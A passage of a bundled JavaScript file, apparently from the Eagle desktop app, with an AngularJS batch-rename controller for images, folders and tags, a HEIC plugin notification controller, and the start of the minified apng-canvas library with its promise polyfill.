                $scope.updatePreview();
            });

            $scope.changeReplaceMethod = (mode) => {
                $scope.replaceMethod = mode;
                $scope.updatePreview();
                setTimeout(() => {
                    $scope.focusInput();
                }, 100);
            };

            $scope.focusInput = () => {
                $(".batch-rename-modal").find("input:visible").eq(0).focus();
            };

            function createRegexFromString(regexString) {
                // Match the pattern and the flags within the slashes.
                const match = regexString.match(/^\/(.+)\/([a-z]*)$/);
                if (!match) {
                  throw new Error("Invalid regex format");
                }
              
                // Extract pattern and flags from the regex string
                const [_, pattern, flags] = match;
              
                // Return the RegExp object
                return new RegExp(pattern, flags);
              }

            $scope.updatePreview = () => {

                const newName = $scope.newName || "";
                const newNameLower = newName.toLowerCase();

                const getBeforeHTML = (name) => {
                    // 如果原始文字出現 $scope.findString，就將一樣的字串加上刪除線
                    if ($scope.findString) {
                        let findString = escapeRegExp($scope.findString);
                        if ($scope.isRegex) {
                            name = name.replace($scope.regex, `<s>$&</s>`).replaceAll(/\\/g, '');
                        }
                        else {
                            name = name.replace(new RegExp(findString, "g"), `<s>${findString}</s>`).replaceAll(/\\/g, '');
                        }
                    }
                    return name;
                };

                const getAfterHTML = (name) => {
                    // 如果原始文字出現 $scope.replaceString，就將一樣的字串加上<b></b>
                    $scope.replaceString = $scope.replaceString || "";
                    let replaceString = escapeRegExp($scope.replaceString);
                    if ($scope.isRegex) {
                        name = name.replace($scope.regex, `<b>${replaceString}</b>`).replaceAll(/\\/g, '');
                    }
                    else {
                        name = name.replace(new RegExp(replaceString, "g"), `<b>${replaceString}</b>`).replaceAll(/\\/g, '');
                    }
                    return name;
                };

                const escapeRegExp = (string) => {
                    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
                };

                if (!$scope.items) return;
                $scope.previews = [];
                if ($scope.replaceMethod === "format") {
                    $scope.previews = $scope.items.map((item, index) => {
                        return {
                            item: item,
                            thumbnail: ($scope.type === "IMAGE" ? FileUrlHelper.getLastestThumbnailUrl(item) : null),
                            before: item.name,
                            after: format(item, newName, {
                                originName: item.name,
                                idx: index + parseInt($scope.startAt)
                            })
                        };
                    });
                }
                else {
                    $scope.previews = $scope.items.map((item, index) => {
                        return {
                            item: item,
                            thumbnail: ($scope.type === "IMAGE" ? FileUrlHelper.getLastestThumbnailUrl(item) : null),
                            before: getBeforeHTML(item.name),
                            after: getAfterHTML(item.name.split($scope.findString).join($scope.replaceString))
                        };
                    });
                }

                $scope.hasIndex = newNameLower.indexOf("%n") > -1;
                $scope.hasDate = newNameLower.indexOf("%d") > -1;
                $scope.hasTags = newNameLower.indexOf("%t") > -1;
                $scope.hasOriginal = newNameLower.indexOf("*") > -1;
            }

            // 快速鍵綁定
            $scope.onKeydown = (event) => {
                var keyCode = event.keyCode;
                if (keyCode === 27) {
                    event.preventDefault();
                    event.stopPropagation();
                    $scope.cancel();
                }
                else if (keyCode === 13) {
                    if (event.metaKey || event.ctrlKey) {
                        event.preventDefault();
                        event.stopPropagation();
                        if ($scope.replaceMethod !== "format") {
                            if (!$scope.findString) return;
                        }
                        else {
                            if (!$scope.newName || !is.number($scope.startAt)) return;
                        }
                        $(event.target).blur();
                        $scope.rename();
                    }
                }
            };

            $scope.insertIndex = () => {
                const item = $scope.items[0];
                const items = ["%N", "%NN", "%NNN", "%NNNN"].map((label) => {
                    return {
                        label: format(item, $scope.newName + label, {
                            originName: item.name,
                            idx: parseInt($scope.startAt)
                        }),
                        accelerator: label,
                        click: () => {
                            $scope.newName += label;
                            $scope.$evalAsync();
                        }
                    };
                });

                ContextMenu.open({
                    items: items,
                    showSearch: false,
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            $scope.insertDate = () => {
                const item = $scope.items[0];
                const items = ["%D", "%DD", "%DDD"].map((label) => {
                    return {
                        label: format(item, $scope.newName + label, {
                            originName: item.name,
                            idx: parseInt($scope.startAt)
                        }),
                        accelerator: label,
                        click: () => {
                            $scope.newName += label;
                            $scope.$evalAsync();
                        }
                    };
                });

                ContextMenu.open({
                    items: items,
                    showSearch: false,
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            $scope.insertTags = () => {
                const item = $scope.items[0];
                const items = ["%T"].map((label) => {
                    return {
                        label: format(item, $scope.newName + label, {
                            originName: item.name,
                            idx: parseInt($scope.startAt)
                        }),
                        accelerator: label,
                        click: () => {
                            $scope.newName += label;
                            $scope.$evalAsync();
                        }
                    };
                });

                ContextMenu.open({
                    items: items,
                    showSearch: false,
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            $scope.insertOriginal = () => {
                const item = $scope.items[0];
                const items = ["*"].map((label) => {
                    return {
                        label: format(item, $scope.newName + label, {
                            originName: item.name,
                            idx: parseInt($scope.startAt)
                        }),
                        accelerator: label,
                        click: () => {
                            $scope.newName += label;
                            $scope.$evalAsync();
                        }
                    };
                });

                ContextMenu.open({
                    items: items,
                    showSearch: false,
                    onClosed: () => {
                        $scope.focusInput();
                    }
                });
            };

            function format(item, name, options) {

                const moment = require('moment');
                var originName = options.originName;
                var idx = options.idx;
                var now = new Date();
                var date1 = moment(now).format("YYYY-MM-DD");
                var date2 = moment(now).format("MM-DD");
                var date3 = moment(now).format("ll");
                var newName = name;
                try {
                    newName = newName.replace(/%NNNNNNNNN+/i, $filter('numberFixedLen')(idx, 9));
                    newName = newName.replace(/%nnnnnnnnn+/i, $filter('numberFixedLen')(idx, 9));
                    newName = newName.replace(/%NNNNNNNNN/i, $filter('numberFixedLen')(idx, 8));
                    newName = newName.replace(/%nnnnnnnnn/i, $filter('numberFixedLen')(idx, 8));
                    newName = newName.replace(/%NNNNNNNN/i, $filter('numberFixedLen')(idx, 8));
                    newName = newName.replace(/%nnnnnnnn/i, $filter('numberFixedLen')(idx, 8));
                    newName = newName.replace(/%NNNNNNN/i, $filter('numberFixedLen')(idx, 7));
                    newName = newName.replace(/%nnnnnnn/i, $filter('numberFixedLen')(idx, 7));
                    newName = newName.replace(/%NNNNNN/i, $filter('numberFixedLen')(idx, 6));
                    newName = newName.replace(/%nnnnnn/i, $filter('numberFixedLen')(idx, 6));
                    newName = newName.replace(/%NNNNN/i, $filter('numberFixedLen')(idx, 5));
                    newName = newName.replace(/%nnnnn/i, $filter('numberFixedLen')(idx, 5));
                    newName = newName.replace(/%NNNN/i, $filter('numberFixedLen')(idx, 4));
                    newName = newName.replace(/%nnnn/i, $filter('numberFixedLen')(idx, 4));
                    newName = newName.replace(/%NNN/i, $filter('numberFixedLen')(idx, 3));
                    newName = newName.replace(/%nnn/i, $filter('numberFixedLen')(idx, 3));
                    newName = newName.replace(/%NN/i, $filter('numberFixedLen')(idx, 2));
                    newName = newName.replace(/%nn/i, $filter('numberFixedLen')(idx, 2));
                    newName = newName.replace(/%N/i, $filter('numberFixedLen')(idx, 1));
                    newName = newName.replace(/%n/i, $filter('numberFixedLen')(idx, 1));
                    newName = newName.replace(/%DDD+/i, date3);
                    newName = newName.replace(/%DDD/i, date3);
                    newName = newName.replace(/%DD/i, date2);
                    newName = newName.replace(/%D/i, date1);
                    newName = newName.replace(/%ddd+/i, date3);
                    newName = newName.replace(/%ddd/i, date3);
                    newName = newName.replace(/%dd/i, date2);
                    newName = newName.replace(/%d/i, date1);
                    newName = newName.replace(/\*/i, originName);
                    if (newName.match("%T")) {
                        let tagString = "";
                        if (item.tags && item.tags.length > 0) {
                            tagString = item.tags.join("-");
                            newName = newName.replace(/%T/i, tagString);
                        }
                        else {
                            newName = newName.replace(/%T/i, "");
                        }
                    }
                    if ($scope.type === "IMAGE") {
                        newName = newName.replace(/[/]/g, '').replace(emojiRegex, '').replace(/%/g, "");
                        newName = sanitize(newName);
                    }
                    if (newName.length === 0) {
                        newName = originName;
                    }
                } catch (e) {
                    newName = originName;
                }
                newName = newName.substr(0, 255);
                return newName;
            };

            // 重命名按鈕點擊時
            $scope.rename = () => {

                const rename = () => {

                    if ($scope.isRenaing) return;

                    $scope.isRenaing = true;

                    switch ($scope.type) {
                        case "IMAGE":
                            $scope.renameImages();
                            $scope.close();
                            break;
                        case "FOLDER":
                        case "SMART_FOLDER":
                            $scope.renameFolders();
                            $scope.close();
                            break;
                        case "TAGS":
                            $scope.renameTags();
                            $scope.close();
                            break;
                    }
                };

                let showAlert = 10;
                if ($scope.type === "TAGS") {
                    showAlert = 2;
                }
                if ($scope.items.length >= showAlert) {
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__("dialog.batchRename.title")}</h4>
                                <p class="alert-desc">${i18n.__("dialog.batchRename.desc1") + $scope.items.length + i18n.__("dialog.batchRename.desc2")}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 20,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("dialog.batchRename.renameBtn"),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {
                        rename();
                    });
                }
                else {
                    rename();
                }
            };

            // 批次修改圖片名稱
            $scope.renameImages = () => {

                var changedItems = [];
                var originalItems = [];

                // 全新格式
                if ($scope.replaceMethod == "format") {
                    $scope.items.forEach(function (item, index) {
                        var cloneItem = angular.copy(item);
                        var originItem = angular.copy(item);
                        var originName = cloneItem.name;
                        var newName = format(item, $scope.newName, {
                            originName: originName,
                            idx: index + parseInt($scope.startAt)
                        });

                        if (cloneItem.name !== newName) {
                            cloneItem.name = newName;
                            cloneItem.oldName = originName;
                            cloneItem.newName = newName;
                            changedItems.push(cloneItem);

                            originItem.name = originName;
                            originItem.oldName = cloneItem.newName;
                            originItem.newName = originName;
                            originalItems.push(originItem);
                        }
                    });
                    ayncsImagesChange(changedItems);
                    hiddenByCurrentFilter(changedItems);
                }

                // 取代字串
                else {
                    $scope.items.forEach(function (item, index) {
                        var cloneItem = angular.copy(item);
                        var originItem = angular.copy(item);
                        var originName = cloneItem.name;
                        var newName;

                        if ($scope.isRegex) {
                            newName = originName.replace($scope.regex, $scope.replaceString);
                        }
                        else {
                            newName = originName.split($scope.findString).join($scope.replaceString);
                        }

                        if (cloneItem.name !== newName) {
                            cloneItem.name = newName;
                            cloneItem.oldName = originName;
                            cloneItem.newName = newName;
                            changedItems.push(cloneItem);

                            originItem.name = originName;
                            originItem.oldName = cloneItem.newName;
                            originItem.newName = originName;
                            originalItems.push(originItem);
                        }
                    });

                    ayncsImagesChange(changedItems);
                    hiddenByCurrentFilter(changedItems);
                }

                try { electronLog && electronLog.info(`[app] Batch rename ${$scope.items.length} files, using format: ${$scope.replaceMethod}`); } catch (err) { };

                // 復原
                var message = $filter('i18n')("notify.image.rename", [
                    { "property": "count", "value": $scope.items.length },
                ]);
                if ($scope.items.length === 1) { message = message.replace("images", "image"); }
                $rootScope.notify({
                    message: message,
                    duration: 10000,
                }, function () {
                    ayncsImagesChange(originalItems);
                });

                if ($scope.newName) {
                    localStorage.setItem("BATCH_RENAME_LAST_NAME", $scope.newName);
                }
            }

            // 批次修改資料夾名稱
            $scope.renameFolders = () => {

                var originNames = {};

                // 全新格式
                if ($scope.replaceMethod == "format") {
                    $scope.items.forEach(function (item, index) {
                        var originName = item.name;
                        var newName = format(item, $scope.newName, {
                            originName: originName,
                            idx: index + parseInt($scope.startAt)
                        });
                        item.name = newName;
                        originNames[item.id] = originName;
                    });
                    $bodyScope.saveFolder();
                    $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                }

                // 取代字串
                else {
                    $scope.items.forEach(function (item, index) {
                        var originName = item.name;
                        var newName = originName.split($scope.findString).join($scope.replaceString);
                        item.name = newName;
                        originNames[item.id] = originName;
                    });
                    $bodyScope.saveFolder();
                    $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                }

                try { electronLog && electronLog.info(`[app] Batch rename ${$scope.items.length} ${$scope.type}, using format: ${$scope.replaceMethod}`); } catch (err) { };

                // 復原
                var message = $filter('i18n')("notify.image.rename", [
                    { "property": "count", "value": $scope.items.length },
                ]);
                if ($scope.items.length === 1) { message = message.replace("images", "image"); }
                $rootScope.notify({
                    message: message,
                    duration: 10000,
                }, function () {
                    $scope.items.forEach(function (item) {
                        if (originNames[item.id]) {
                            item.name = originNames[item.id];
                        }
                    });
                    $bodyScope.saveFolder();
                    $rootScope.$broadcast("CALCULATE_IMAGE_BINDING");
                });
            }

            // 批次修改標籤名稱
            $scope.renameTags = () => {

                let old2new = {};

                // 全新格式
                if ($scope.replaceMethod == "format") {
                    $scope.items.forEach(function (item, index) {
                        var originName = item.name;
                        var newName = format(item, $scope.newName, {
                            originName: originName,
                            idx: index + parseInt($scope.startAt)
                        });
                        old2new[originName] = newName;
                    });
                }
                // 取代字串
                else {
                    $scope.items.forEach(function (item, index) {
                        var originName = item.name;
                        var newName = originName.split($scope.findString).join($scope.replaceString);
                        old2new[originName] = newName;
                    });
                }

                let changed = [];
                for (let rindex = $bodyScope.raw.length - 1; rindex >= 0; rindex--) {
                    let item = $bodyScope.raw[rindex];
                    let needUpadate = false;
                    if (item?.tags) {
                        item.tags.forEach((tag, index) => {
                            if (old2new[tag]) {
                                item.tags[index] = old2new[tag];
                                needUpadate = true;
                            }
                        });
                        if (needUpadate) {
                            item.tags = [...new Set(item.tags)];
                            changed.push(item);
                        }
                    }
                }

                // 修改标签群组包含的标签
                if ($bodyScope.TagManager.groups.length > 0) {
                    $bodyScope.TagManager.groups.forEach(function (group) {
                        if (group.tags) {
                            if (group?.tags) {
                                let needUpadate = false;
                                group.tags.forEach((tag, index) => {
                                    if (old2new[tag]) {
                                        group.tags[index] = old2new[tag];
                                        needUpadate = true;
                                    }
                                });
                                if (needUpadate) {
                                    group.tags = [...new Set(group.tags)];
                                }
                            }
                        }
                    });
                }

                // 更新所有文件夹智能标签
                eagle.utils.tree.walk($bodyScope.folders, 'children', function (folder, parent) {
                    if (folder && folder.tags) {
                        let needUpadate = false;
                        folder.tags.forEach((tag, index) => {
                            if (old2new[tag]) {
                                folder.tags[index] = old2new[tag];
                                needUpadate = true;
                            }
                        });
                        if (needUpadate) {
                            folder.tags = [...new Set(folder.tags)];
                        }
                    }
                });

                // 更新智能文件夹的标签属性
                eagle.utils.tree.walk($bodyScope.smartFolders, 'children', function (smartFolder, parent, depth) {
                    if (!smartFolder.conditions) return;
                    smartFolder.conditions.forEach(function (condition) {
                        if (!condition.rules) return;
                        condition.rules.forEach(function (rule) {
                            if (rule && rule.property === 'tags') {
                                var ruleTags = rule.value;
                                let needUpadate = false;
                                if (ruleTags && ruleTags.length > 0) {
                                    ruleTags.forEach((tag, index) => {
                                        if (old2new[tag]) {
                                            ruleTags[index] = old2new[tag];
                                            needUpadate = true;
                                        }
                                    });
                                    if (needUpadate) {
                                        rule.value = [...new Set(rule.value)];
                                    }
                                }
                            }
                        });
                    });
                });

                ayncsImagesChange(changed);
                hiddenByCurrentFilter(changed);
                $bodyScope.saveFolder();
                $bodyScope.calculateImageBinding();
            };

            $scope.cancel = () => {
                $scope.close();
            };

            $scope.close = () => {
                $scope.isOpen = false;
                $scope.isRenaing = false;
            };
        }
    }
});
EagleApp.controller("HeicNotificationController", function($scope, $timeout, $rootScope, $filter) {
	ipcRenderer.on('plugin-installed', (event, pluginId) => {
		if (pluginId === 'heic-format-extension') {
			$scope.isOpen = false;
			$scope.$evalAsync();
		}
	});
	$scope.isOpen = false;
	$scope.close = () => {
		$scope.isOpen = false;
	}
	$scope.$on('SHOW_HEIC_NOTIFICATION', () => {
		$scope.isOpen = true;
	});
	$scope.openPlugin = () => {
		currentWindow.webContents.send('install-plugin', 'heic-format-extension');
	};
});
/**
 * apng-canvas v2.0.1
 * @copyright 2011, 2015 David Mzareulyan
 * @link https://github.com/davidmz/apng-canvas
 * @license MIT
 */
!function t(e,n,r){function i(a,s){if(!n[a]){if(!e[a]){var u="function"==typeof require&&require;if(!s&&u)return u(a,!0);if(o)return o(a,!0);throw new Error("Cannot find module '"+a+"'")}var c=n[a]={exports:{}};e[a][0].call(c.exports,function(t){var n=e[a][1][t];return i(n?n:t)},c,c.exports,t,e,n,r)}return n[a].exports}for(var o="function"==typeof require&&require,a=0;a<r.length;a++)i(r[a]);return i}({1:[function(t,e,n){(function(n,r){(function(){"use strict";function i(t){return"function"==typeof t||"object"==typeof t&&null!==t}function o(t){return"function"==typeof t}function a(t){Z=t}function s(t){z=t}function u(){return function(){n.nextTick(d)}}function c(){return function(){Q(d)}}function f(){var t=0,e=new et(d),n=document.createTextNode("");return e.observe(n,{characterData:!0}),function(){n.data=t=++t%2}}function h(){var t=new MessageChannel;return t.port1.onmessage=d,function(){t.port2.postMessage(0)}}function l(){return function(){setTimeout(d,1)}}function d(){for(var t=0;t<$;t+=2){var e=it[t],n=it[t+1];e(n),it[t]=void 0,it[t+1]=void 0}$=0}function p(){try{var e=t,n=e("vertx");return Q=n.runOnLoop||n.runOnContext,c()}catch(r){return l()}}function A(t,e){var n=this,r=new this.constructor(m);void 0===r[st]&&k(r);var i=n._state;if(i){var o=arguments[i-1];z(function(){I(i,r,o,n._result)})}else B(n,r,t,e);return r}function v(t){var e=this;if(t&&"object"==typeof t&&t.constructor===e)return t;var n=new e(m);return x(n,t),n}function m(){}function g(){return new TypeError("You cannot resolve a promise with itself")}function w(){return new TypeError("A promises callback cannot return that same promise.")}function y(t){try{return t.then}catch(e){return ht.error=e,ht}}function _(t,e,n,r){try{t.call(e,n,r)}catch(i){return i}}function b(t,e,n){z(function(t){var r=!1,i=_(n,e,function(n){r||(r=!0,e!==n?x(t,n):C(t,n))},function(e){r||(r=!0,T(t,e))},"Settle: "+(t._label||" unknown promise"));!r&&i&&(r=!0,T(t,i))},t)}function E(t,e){e._state===ct?C(t,e._result):e._state===ft?T(t,e._result):B(e,void 0,function(e){x(t,e)},function(e){T(t,e)})}function P(t,e,n){e.constructor===t.constructor&&n===ot&&constructor.resolve===at?E(t,e):n===ht?T(t,ht.error):void 0===n?C(t,e):o(n)?b(t,e,n):C(t,e)}function x(t,e){t===e?T(t,g()):i(e)?P(t,e,y(e)):C(t,e)}function N(t){t._onerror&&t._onerror(t._result),O(t)}function C(t,e){t._state===ut&&(t._result=e,t._state=ct,0!==t._subscribers.length&&z(O,t))}function T(t,e){t._state===ut&&(t._state=ft,t._result=e,z(N,t))}function B(t,e,n,r){var i=t._subscribers,o=i.length;t._onerror=null,i[o]=e,i[o+ct]=n,i[o+ft]=r,0===o&&t._state&&z(O,t)}function O(t){var e=t._subscribers,n=t._state;if(0!==e.length){for(var r,i,o=t._result,a=0;a<e.length;a+=3)r=e[a],i=e[a+n],r?I(n,r,i,o):i(o);t._subscribers.length=0}}function R(){this.error=null}function U(t,e){try{return t(e)}catch(n){return lt.error=n,lt}}function I(t,e,n,r){var i,a,s,u,c=o(n);if(c){if(i=U(n,r),i===lt?(u=!0,a=i.error,i=null):s=!0,e===i)return void T(e,w())}else i=r,s=!0;e._state!==ut||(c&&s?x(e,i):u?T(e,a):t===ct?C(e,i):t===ft&&T(e,i))}function L(t,e){try{e(function(e){x(t,e)},function(e){T(t,e)})}catch(n){T(t,n)}}function D(){return dt++}function k(t){t[st]=dt++,t._state=void 0,t._result=void 0,t._subscribers=[]}function S(t){return new gt(this,t).promise}function j(t){var e=this;return new e(W(t)?function(n,r){for(var i=t.length,o=0;o<i;o++)e.resolve(t[o]).then(n,r)}:function(t,e){e(new TypeError("You must pass an array to race."))})}function F(t){var e=this,n=new e(m);return T(n,t),n}function G(){throw new TypeError("You must pass a resolver function as the first argument to the promise constructor")}function M(){throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.")}function q(t){this[st]=D(),this._result=this._state=void 0,this._subscribers=[],m!==t&&("function"!=typeof t&&G(),this instanceof q?L(this,t):M())}function Y(t,e){this._instanceConstructor=t,this.promise=new t(m),this.promise[st]||k(this.promise),W(e)?(this._input=e,this.length=e.length,this._remaining=e.length,this._result=new Array(this.length),0===this.length?C(this.promise,this._result):(this.length=this.length||0,this._enumerate(),0===this._remaining&&C(this.promise,this._result))):T(this.promise,V())}function V(){return new Error("Array Methods must be provided an Array")}function H(){var t;if("undefined"!=typeof r)t=r;else if("undefined"!=typeof self)t=self;else try{t=Function("return this")()}catch(e){throw new Error("polyfill failed because global object is unavailable in this environment")}var n=t.Promise;n&&"[object Promise]"===Object.prototype.toString.call(n.resolve())&&!n.cast||(t.Promise=mt)}var J;J=Array.isArray?Array.isArray:function(t){return"[object Array]"===Object.prototype.toString.call(t)};var Q,Z,K,W=J,$=0,z=function(t,e){it[$]=t,it[$+1]=e,$+=2,2===$&&(Z?Z(d):K())},X="undefined"!=typeof window?window:void 0,tt=X||{},et=tt.MutationObserver||tt.WebKitMutationObserver,nt="undefined"==typeof self&&"undefined"!=typeof n&&"[object process]"==={}.toString.call(n),rt="undefined"!=typeof Uint8ClampedArray&&"undefined"!=typeof importScripts&&"undefined"!=typeof MessageChannel,it=new Array(1e3);K=nt?u():et?f():rt?h():void 0===X&&"function"==typeof t?p():l();var ot=A,at=v,st=Math.random().toString(36).substring(16),ut=void 0,ct=1,ft=2,ht=new R,lt=new R,dt=0,pt=S,At=j,vt=F,mt=q;q.all=pt,q.race=At,q.resolve=at,q.reject=vt,q._setScheduler=a,q._setAsap=s,q._asap=z,q.prototype={constructor:q,then:ot,"catch":function(t){return this.then(null,t)}};var gt=Y;Y.prototype._enumerate=function(){for(var t=this.length,e=this._input,n=0;this._state===ut&&n<t;n++)this._eachEntry(e[n],n)},Y.prototype._eachEntry=function(t,e){var n=this._instanceConstructor,r=n.resolve;if(r===at){var i=y(t);if(i===ot&&t._state!==ut)this._settledAt(t._state,e,t._result);else if("function"!=typeof i)this._remaining--,this._result[e]=t;else if(n===mt){var o=new n(m);P(o,t,i),this._willSettleAt(o,e)}else this._willSettleAt(new n(function(e){e(t)}),e)}else this._willSettleAt(r(t),e)},Y.prototype._settledAt=function(t,e,n){var r=this.promise;r._state===ut&&(this._remaining--,t===ft?T(r,n):this._result[e]=n),0===this._remaining&&C(r,this._result)},Y.prototype._willSettleAt=function(t,e){var n=this;B(t,void 0,function(t){n._settledAt(ct,e,t)},function(t){n._settledAt(ft,e,t)})};var wt=H,yt={Promise:mt,polyfill:wt};"function"==typeof define&&define.amd?define(function(){return yt}):"undefined"!=typeof e&&e.exports?e.exports=yt:"undefined"!=typeof this&&(this.ES6Promise=yt),wt()}).call(this)}).call(this,t("pBGvAp"),"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{pBGvAp:2}],2:[function(t,e,n){function r(){}var i=e.exports={};i.nextTick=function(){var t="undefined"!=typeof window&&window.setImmediate,e="undefined"!=typeof window&&window.postMessage&&window.addEventListener;if(t)return function(t){return window.setImmediate(t)};if(e){var n=[];return window.addEventListener("message",function(t){var e=t.source;if((e===window||null===e)&&"process-tick"===t.data&&(t.stopPropagation(),n.length>0)){var r=n.shift();r()}},!0),function(t){n.push(t),window.postMessage("process-tick","*")}}return function(t){setTimeout(t,0)}}(),i.title="browser",i.browser=!0,i.env={},i.argv=[],i.on=r,i.addListener=r,i.once=r,i.off=r,i.removeListener=r,i.removeAllListeners=r,i.emit=r,i.binding=function(t){throw new Error("process.binding is not supported")},i.cwd=function(){return"/"},i.chdir=function(t){throw new Error("process.chdir is not supported")}},{}],3:[function(t,e,n){"use strict";var r=function(){this.width=0,this.height=0,this.numPlays=0,this.playTime=0,this.frames=[],this.play=function(){i||o||(this.rewind(),i=!0,requestAnimationFrame(s))},this.rewind=function(){e=0,n=0,r=null,i=!1,o=!1},this.addContext=function(t){if(a.length>0){var e=a[0].getImageData(0,0,this.width,this.height);t.putImageData(e,0,0)}a.push(t),t._apng_animation=this},this.removeContext=function(t){var e=a.indexOf(t);e!==-1&&(a.splice(e,1),0===a.length&&this.rewind(),"_apng_animation"in t&&delete t._apng_animation)},this.isPlayed=function(){return i},this.isFinished=function(){return o};var t=this,e=0,n=0,r=null,i=!1,o=!1,a=[],s=function(t){for(;i&&e<=t;)u(t);i&&requestAnimationFrame(s)},u=function(s){var u=n++%t.frames.length,c=t.frames[u];if(0==u&&(a.forEach(function(e){e.clearRect(0,0,t.width,t.height)}),r=null,2==c.disposeOp&&(c.disposeOp=1)),r&&1==r.disposeOp?a.forEach(function(t){t.clearRect(r.left,r.top,r.width,r.height)}):r&&2==r.disposeOp&&a.forEach(function(t){t.putImageData(r.iData,r.left,r.top)}),r=c,r.iData=null,2==r.disposeOp&&(r.iData=a[0].getImageData(c.left,c.top,c.width,c.height)),0==c.blendOp&&a.forEach(function(t){t.clearRect(c.left,c.top,c.width,c.height)}),a.forEach(function(t){t.drawImage(c.img,c.left,c.top)}),0==t.numPlays||n/t.frames.length<t.numPlays){for(0==e&&(e=s);s>e+t.playTime;)e+=t.playTime;e+=c.delay}else i=!1,o=!1}};e.exports=r},{}],4:[function(t,e,n){"use strict";for(var r=new Uint32Array(256),i=0;i<256;i++){for(var o=i,a=0;a<8;a++)o=1&o?3988292384^o>>>1:o>>>1;r[i]=o}e.exports=function(t,e,n){e=e||0,n=n||t.length-e;for(var i=-1,o=e,a=e+n;o<a;o++)i=i>>>8^r[255&(i^t[o])];return i^-1}},{}],5:[function(t,e,n){(function(e){"use strict";var n=t("./support-test"),r=t("./parser"),i=t("./loader"),o=e.APNG={};o.checkNativeFeatures=n.checkNativeFeatures,o.ifNeeded=n.ifNeeded,o.parseBuffer=function(t){return r(t)};var a={};o.parseURL=function(t){return t in a||(a[t]=i(t).then(r)),a[t]},o.animateContext=function(t,e){return o.parseURL(t).then(function(t){return t.addContext(e),t.play(),t})},o.animateImage=function(t){return t.setAttribute("data-is-apng","progress"),o.parseURL(t.src).then(function(e){t.setAttribute("data-is-apng","yes");var n=document.createElement("canvas");n.width=e.width,n.height=e.height,Array.prototype.slice.call(t.attributes).forEach(function(t){["alt","src","usemap","ismap","data-is-apng","width","height"].indexOf(t.nodeName)==-1&&n.setAttributeNode(t.cloneNode(!1))}),n.setAttribute("data-apng-src",t.src),""!=t.alt&&n.appendChild(document.createTextNode(t.alt));var r="",i="",o=0,a="";""!=t.style.width&&"auto"!=t.style.width?r=t.style.width:t.hasAttribute("width")&&(r=t.getAttribute("width")+"px"),""!=t.style.height&&"auto"!=t.style.height?i=t.style.height:t.hasAttribute("height")&&(i=t.getAttribute("height")+"px"),""!=r&&""==i&&(o=parseFloat(r),a=r.match(/\D+$/)[0],i=Math.round(n.height*o/n.width)+a),""!=i&&""==r&&(o=parseFloat(i),a=i.match(/\D+$/)[0],r=Math.round(n.width*o/n.height)+a),n.style.width=r,n.style.height=i;var s=t.parentNode;s.insertBefore(n,t),s.removeChild(t),e.addContext(n.getContext("2d")),e.play()},function(){t.setAttribute("data-is-apng","no")})},o.releaseCanvas=function(t){var e=t.getContext("2d");"_apng_animation"in e&&e._apng_animation.removeContext(e)}}).call(this,"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"./loader":6,"./parser":7,"./support-test":8}],6:[function(t,e,n){"use strict";var r=r||t("es6-promise").Promise;e.exports=function(t){return new r(function(e,n){var r=new XMLHttpRequest;r.open("GET",t),r.responseType="arraybuffer",r.onload=function(){200==this.status?e(this.response):n(this)},r.send()})}},{"es6-promise":1}],7:[function(t,e,n){"use strict";var r=r||t("es6-promise").Promise,i=t("./animation"),o=t("./crc32"),a=new Uint8Array([137,80,78,71,13,10,26,10]);e.exports=function(t){var e=new Uint8Array(t);return new r(function(t,n){for(var r=0;r<a.length;r++)if(a[r]!=e[r])return void n("Not a PNG file (invalid file signature)");var o=!1;if(s(e,function(t){return"acTL"!=t||(o=!0,!1)}),!o)return void n("Not an animated PNG");var l=[],p=[],v=null,m=null,g=new i;if(s(e,function(t,e,n,r){switch(t){case"IHDR":v=e.subarray(n+8,n+8+r),g.width=u(e,n+8),g.height=u(e,n+12);break;case"acTL":g.numPlays=u(e,n+8+4);break;case"fcTL":m&&g.frames.push(m),m={},m.width=u(e,n+8+4),m.height=u(e,n+8+8),m.left=u(e,n+8+12),m.top=u(e,n+8+16);var i=c(e,n+8+20),o=c(e,n+8+22);0==o&&(o=100),m.delay=1e3*i/o,m.delay<=10&&(m.delay=100),g.playTime+=m.delay,m.disposeOp=f(e,n+8+24),m.blendOp=f(e,n+8+25),m.dataParts=[];break;case"fdAT":m&&m.dataParts.push(e.subarray(n+8+4,n+8+r));break;case"IDAT":m&&m.dataParts.push(e.subarray(n+8,n+8+r));break;case"IEND":p.push(h(e,n,12+r));break;default:l.push(h(e,n,12+r))}}),m&&g.frames.push(m),0==g.frames.length)return void n("Not an animated PNG");for(var w=0,y=new Blob(l),_=new Blob(p),b=0;b<g.frames.length;b++){m=g.frames[b];var E=[];E.push(a),v.set(d(m.width),0),v.set(d(m.height),4),E.push(A("IHDR",v)),E.push(y);for(var P=0;P<m.dataParts.length;P++)E.push(A("IDAT",m.dataParts[P]));E.push(_);var x=URL.createObjectURL(new Blob(E,{type:"image/png"}));delete m.dataParts,E=null,m.img=document.createElement("img"),m.img.onload=function(){URL.revokeObjectURL(this.src),w++,w==g.frames.length&&t(g)},m.img.onerror=function(){n("Image creation error")},m.img.src=x}})};var s=function(t,e){var n=8;do{var r=u(t,n),i=l(t,n+4,4),o=e(i,t,n,r);n+=12+r}while(o!==!1&&"IEND"!=i&&n<t.length)},u=function(t,e){var n=0;n+=t[0+e]<<24>>>0;for(var r=1;r<4;r++)n+=t[r+e]<<8*(3-r);return n},c=function(t,e){for(var n=0,r=0;r<2;r++)n+=t[r+e]<<8*(1-r);return n},f=function(t,e){return t[e]},h=function(t,e,n){var r=new Uint8Array(n);return r.set(t.subarray(e,e+n)),r},l=function(t,e,n){var r=Array.prototype.slice.call(t.subarray(e,e+n));return 